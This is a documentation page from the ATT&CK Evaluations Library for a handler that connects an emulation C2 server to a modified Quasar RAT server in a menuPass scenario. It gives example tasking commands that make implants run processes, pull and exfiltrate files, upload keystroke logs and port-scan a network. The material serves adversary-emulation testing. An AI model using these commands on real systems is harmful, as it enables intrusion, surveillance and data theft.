@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771968189966">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Quasar C2 Server Compatibility Handler</title>
+    <meta name="title" content="Quasar C2 Server Compatibility Handler">
+    <meta name="description" content="This Quasar handler links the ATT&CK Evals C2 server with the standalone Quasar C2 server by MaxXor. Note that the Quasar C2 server has been modified...">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/managedservices/menupass/resources/control_server/handlers/quasar/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/managedservices/menupass/resources/control_server/handlers/quasar/">
+    <meta property="og:title" content="Quasar C2 Server Compatibility Handler">
+    <meta property="og:description" content="This Quasar handler links the ATT&CK Evals C2 server with the standalone Quasar C2 server by MaxXor. Note that the Quasar C2 server has been modified...">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/managedservices/menupass/resources/control_server/handlers/quasar/">
+    <meta property="twitter:title" content="Quasar C2 Server Compatibility Handler">
+    <meta property="twitter:description" content="This Quasar handler links the ATT&CK Evals C2 server with the standalone Quasar C2 server by MaxXor. Note that the Quasar C2 server has been modified...">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../../../resources/css/retype.css?v=3.5.0.771968189966" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../../../resources/js/config.js?v=3.5.0.771968189966" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../../../resources/js/lunr.js?v=3.5.0.771968189966" data-turbo-eval="false" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Managed Services
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../managedservices/menupass/" class="pr-4">
+                                                menu​Pass
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Resources
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../managedservices/menupass/resources/control_server/" class="pr-4">
+                                                ATT&​CK Evaluations Control Server
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Handlers
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../../managedservices/menupass/resources/control_server/handlers/quasar/" class="pr-4">
+                                                Quasar C​2 Server Compatibility Handler
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="quasar-c2-server-compatibility-handler" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#quasar-c2-server-compatibility-handler">#</doc-anchor-trigger>
+        <span>Quasar C2 Server Compatibility Handler</span>
+    </h1>
+</doc-anchor-target>
+<p>This Quasar handler links the ATT&amp;CK Evals C2 server with the standalone <a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar C2 server by MaxXor</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.
+Note that the Quasar C2 server has been modified to support compatibility with the Evals C2 server - for more information, please see the modified
+Quasar C2 server documentation in your Evals repository.</p>
+<p>The compatibility between the Evals C2 server and the Quasar C2 server leverages REST API functionality provided by both the Evals C2 server and the modified Quasar
+C2 server.</p>
+<doc-anchor-target id="features">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#features">#</doc-anchor-trigger>
+        <span>Features</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>Tracks Quasar implant sessions that are actively connected to the Quasar server
+<ul>
+<li>Every 15 seconds, gets a list of active Quasar implant connections. New implant connections are logged as new Quasar sessions via the Evals REST API server.</li>
+<li>Implant sessions that get disconnected are logged to the Evals C2 server log file.</li>
+</ul>
+</li>
+<li>Can task Quasar implants to do the following:
+<ul>
+<li>Execute processes on the local target machine</li>
+<li>Perform a port scan for specific ports against a given network range</li>
+<li>Download files from the Quasar server (the files must exist on the Quasar server itself)</li>
+<li>Upload files to the Quasar server, which the Quasar evals C2 handler will pick up and save locally on the Evals C2 server.</li>
+<li>Upload logged keystrokes to the Quasar server</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="tasking">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#tasking">#</doc-anchor-trigger>
+        <span>Tasking</span>
+    </h2>
+</doc-anchor-target>
+<p>You can task Quasar implants by sending requests to the internal REST server using the <code v-pre>evalsC2client.py</code> script. The Quasar handler will allow operators to task the following command types using a JSON dict payload format.</p>
+<p>The JSON dict can contain the following fields:</p>
+<ul>
+<li><code v-pre>seq</code> - <code v-pre>int</code> that represents the task number for the implant. This is for operator usability purposes so operators don&#x27;t lose track of which commands they ran so far.</li>
+<li><code v-pre>type</code> - <code v-pre>int</code> that represents the task type (e.g. process execution, file download, file upload)
+<ul>
+<li><code v-pre>1</code> - execute a process</li>
+<li><code v-pre>2</code> - download file from Quasar server</li>
+<li><code v-pre>3</code> - upload file to Quasar Server</li>
+<li><code v-pre>4</code> - upload keystroke logs to Quasar Server for the specified client.</li>
+<li><code v-pre>5</code> - perform a port scan against a network range for specific ports</li>
+</ul>
+</li>
+<li><code v-pre>timeout</code> - <code v-pre>int</code> that represents the timeout in seconds for the Quasar handler to wait for tasks to complete. Default is 120 seconds. The timeout will be rounded up to the nearest multiple of 10. Specifying <code v-pre>0</code> will use the default value.</li>
+<li>Specific fields for process execution (task type <code v-pre>1</code>):
+<ul>
+<li><code v-pre>proc_path</code> - string representing the local binary on the target machine to execute</li>
+<li><code v-pre>proc_args</code> - string representing the arguments to pass</li>
+<li><code v-pre>download_url</code> - string representing where to download a binary from to execute</li>
+<li><code v-pre>download_dst</code> - string indicating where to save the binary downloaded from <code v-pre>download_url</code></li>
+<li><code v-pre>use_shell</code> - boolean indicating whether or not to execute the process using the OS shell. See <a href="https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-4.7.2" class="outbound" target="_blank"><span>Microsoft documentation</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> for more information</li>
+<li><code v-pre>get_output</code> - boolean indicating whether or not to wait for the process to finish and retrieve stdout and stderr</li>
+<li><code v-pre>no_window</code> - boolean indicating whether or not to start the process in a new window. Some processes, like notepad, will create a new window regardless.</li>
+</ul>
+</li>
+<li>Specific fields for general file transfers (task types <code v-pre>2</code> and <code v-pre>3</code>):
+<ul>
+<li><code v-pre>transfer_src</code> - <code v-pre>string</code> that represents the source file for file transfers. Required when tasking file downloads or uploads.</li>
+<li><code v-pre>transfer_dst</code> - <code v-pre>string</code> that represents the destination file for file transfers.</li>
+</ul>
+</li>
+<li>Specific fields for port scan tasks (task type <code v-pre>5</code>):
+<ul>
+<li><code v-pre>range</code> - IPv4 CIDR <code v-pre>string</code> that specifies the target network to scan (e.g. <code v-pre>10.0.2.0/28</code>)</li>
+<li><code v-pre>ports</code> - <code v-pre>int</code> array that specifies which port(s) to scan. Must provide at least one port</li>
+</ul>
+</li>
+</ul>
+<p>Below are examples of each type code:</p>
+<ul>
+<li><code v-pre>'{&quot;seq&quot;: 1, &quot;type&quot;: 1, &quot;proc_path&quot;: &quot;whoami.exe&quot;, &quot;proc_args&quot;: &quot;/all&quot;}'</code> - the task type code <code v-pre>1</code> will have the implant execute <code v-pre>whoami.exe /all</code>, and the Quasar handler will retrieve the process stdout, stderr, PID, and exit code.</li>
+<li><code v-pre>'{&quot;seq&quot;: 4, &quot;type&quot;: 1, &quot;proc_path&quot;: &quot;notepad.exe&quot;, &quot;get_output&quot;: false}'</code> - open notepad and only retrieve the PID rather than waiting for process termination</li>
+<li><code v-pre>{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;...&quot;, &quot;transfer_dst&quot;: &quot;...&quot;}</code> - the task type code <code v-pre>2</code> will have the implant download the file specified by <code v-pre>transfer_src</code> from the Quasar server and save it to the path specified by <code v-pre>transfer_dst</code>.</li>
+<li><code v-pre>{&quot;type&quot;: 3, &quot;transfer_src&quot;: &quot;...&quot;, &quot;transfer_dst&quot;: &quot;...&quot;}</code> - the task type code <code v-pre>3</code> will have the implant upload the file specified by <code v-pre>transfer_src</code> to the Quasar server, which will save it locally as the filename specified by <code v-pre>transfer_dst</code>. The Quasar c2 handler will grab the uploaded file and save it locally on the evals c2 server machine under the <code v-pre>./files/</code> subdirectory using the same filename specified by <code v-pre>transfer_dst</code>.</li>
+<li><code v-pre>{&quot;type&quot;: 4}</code> - instruct implant to upload its keystroke log files.</li>
+<li><code v-pre>'{&quot;type&quot;: 5, &quot;range&quot;: &quot;10.0.2.0/28&quot;, &quot;ports&quot;:[8888, 3389], &quot;timeout&quot;: 300}'</code> - instruct implant to perform a port scan for ports 8888 and 3389 against the <code v-pre>10.0.2.0/28</code> network range. The C2 handler will wait 300 seconds (5 minutes) before timing out</li>
+</ul>
+<p>Examples of valid tasking:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task &lt;guid&gt; '{&quot;seq&quot;: 1, &quot;type&quot;: 1, &quot;proc_path&quot;: &quot;whoami.exe&quot;, &quot;proc_args&quot;: &quot;/all&quot;}'
+./evalsC2client.py --set-task &lt;guid&gt; '{&quot;seq&quot;: 4, &quot;type&quot;: 1, &quot;proc_path&quot;: &quot;notepad.exe&quot;, &quot;get_output&quot;: false}'
+./evalsC2client.py --set-task &lt;guid&gt; '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\file\\on\\quasar\\server&quot;, &quot;transfer_dst&quot;: &quot;C:\\dest\\on\\target\\machine&quot;}'
+./evalsC2client.py --set-task &lt;guid&gt; '{&quot;type&quot;: 3, &quot;transfer_src&quot;: &quot;C:\\file\\to\\exfil&quot;, &quot;transfer_dst&quot;: &quot;exfil.zip&quot;}'
+./evalsC2client.py --set-task &lt;guid&gt; '{&quot;type&quot;: 4}'
+./evalsC2client.py --set-task &lt;guid&gt; '{&quot;type&quot;: 5, &quot;range&quot;: &quot;10.0.2.0/28&quot;, &quot;ports&quot;:[8888, 3389], &quot;timeout&quot;: 300}'</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="authentication">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#authentication">#</doc-anchor-trigger>
+        <span>Authentication</span>
+    </h2>
+</doc-anchor-target>
+<p>Under the hood, the Quasar handler will send the expected API key header when making REST API requests. If updating the API key in the Quasar C2 server source code, be sure to update it in the Quasar handler source code and recompile the evals c2 server binary.</p>
+<doc-anchor-target id="decrypting-client-logs">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#decrypting-client-logs">#</doc-anchor-trigger>
+        <span>Decrypting Client Logs</span>
+    </h2>
+</doc-anchor-target>
+<p>Since each Quasar client log entry line is AES-encrypted and then base64-encoded, use the <code v-pre>decryptquasarlogs.py</code> utility to decrypt client logs:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">python3 decryptquasarlogs.py -i /path/to/encrypted/logs -o out.txt</code></pre>
+</doc-codeblock></div>
+<p>You will need to install pycryptodome first: <code v-pre>pip install pycryptodome</code></p>
+<doc-anchor-target id="usage">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#usage">#</doc-anchor-trigger>
+        <span>Usage</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="configuration">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#configuration">#</doc-anchor-trigger>
+        <span>Configuration</span>
+    </h3>
+</doc-anchor-target>
+<p>To enable and configure the Quasar handler within the control server, edit the corresponding handler config file within the <code v-pre>config/</code>
+directory in the main C2 server repo. Create or adjust an existing Quasar handler entry as needed.</p>
+<p>Example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">quasar:
+  host: 10.0.2.7
+  port: 80
+  enabled: true</code></pre>
+</doc-codeblock></div>
+<p>Note that <code v-pre>host</code> and <code v-pre>port</code> will not point to the address and listening port of the Evals C2 server, but rather to the address and listening port
+of the Windows server running the Quasar C2 server.</p>
+<p>Run the <code v-pre>controlServer</code> binary as <code v-pre>sudo</code> and look for success messages in starting up the Quasar handler:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">sudo ./controlServer -c config/yourconfigfile.yml</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="troubleshooting">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#troubleshooting">#</doc-anchor-trigger>
+        <span>Troubleshooting</span>
+    </h2>
+</doc-anchor-target>
+<p>The Quasar handler uses the same logging mechanism as other Evals C2 handlers, so refer to the C2 server logs for any indication of errors.
+However, since Quasar uses a separate server that the Evals C2 handler interacts with to a limited degree, there may be issues between the Quasar server and client
+that the Quasar C2 handler doesn&#x27;t have visilibity on. In those instances, refer to the Quasar documentation to inspect logs and troubleshoot some issues.</p>
+<p>Below are some potential issues and how to address them:</p>
+<ul>
+<li>Suddenly unable to task implant, or implant doesn&#x27;t seem to be picking up new tasks, even though it is active and executed tasks before
+<ul>
+<li>Restart the Quasar server to refresh the connection and then try tasking again</li>
+</ul>
+</li>
+</ul>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../../../managedservices/menupass/resources/control_server/handlers/handlercreationguide/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Creating Your Own Handler</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../../../managedservices/menupass/resources/control_server/handlers/simplefileserver/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Simple File Server</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
